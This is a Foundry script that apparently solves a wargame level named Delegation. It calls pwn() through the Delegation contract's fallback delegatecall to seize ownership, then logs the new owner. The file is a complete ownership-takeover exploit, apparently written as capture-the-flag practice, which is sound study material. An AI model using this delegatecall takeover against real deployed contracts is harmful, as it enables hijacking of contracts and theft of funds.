// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Delegation.sol";

contract Level6Solution is Script
{

Delegation public delegation = Delegation(0xE132447d71EA8dE4A3824358a8378283DF97F10b);
Delegate public del = Delegate(0xE132447d71EA8dE4A3824358a8378283DF97F10b);

function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
       
        del.pwn();
        //delegation(vm.envAddress("MY_ADDRESS"));
        
        console.log("my:" ,vm.envAddress("MY_ADDRESS"));
        console.log("new:" ,delegation.owner());
                
        vm.stopBroadcast();
    }

}
